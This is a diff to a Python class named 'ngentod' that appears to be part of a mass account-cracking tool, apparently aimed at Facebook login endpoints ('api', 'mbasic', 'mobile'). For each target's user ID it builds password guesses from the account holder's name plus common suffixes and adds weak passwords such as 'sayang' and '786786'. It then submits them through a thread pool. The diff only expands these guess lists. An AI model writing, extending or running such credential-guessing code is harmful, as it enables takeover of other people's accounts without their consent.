@@ -543,9 +543,9 @@ class ngentod:
                         uid, name = uh.split('<=>')
                         i = name.split(' ')
                         if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
-                            pwx = [name, i[0]+"123", i[0]+"12345"]
+                            pwx = [name, i[0]+"123", i[0]+"1234", i[0]+"12345"]
                         else:
-                            pwx = [name, i[0]+"123", i[0]+"12345"]
+                            pwx = [name, i[0]+"123", i[0]+"12345", "sayang", "786786"]
                         njir.submit(self.api, uid, pwx)
                     except:
                         pass
@@ -563,7 +563,7 @@ class ngentod:
                         if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                             pwx = [name, i[0]+"123", i[0]+"12345"]
                         else:
-                            pwx = [name, i[0]+"123", i[0]+"12345"]
+                            pwx = [name, i[0]+"123", i[0]+"1234", i[0]+"12345"]
                         njir.submit(self.mbasic, uid, pwx)
                     except:
                         pass
@@ -581,7 +581,7 @@ class ngentod:
                         if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                             pwx = [name, i[0]+"123", i[0]+"12345"]
                         else:
-                            pwx = [name, i[0]+"123", i[0]+"12345"]
+                            pwx = [name, i[0]+"123", i[0]+"1234", i[0]+"12345"]
                         njir.submit(self.mobile, uid, pwx)
                     except:
                         pass
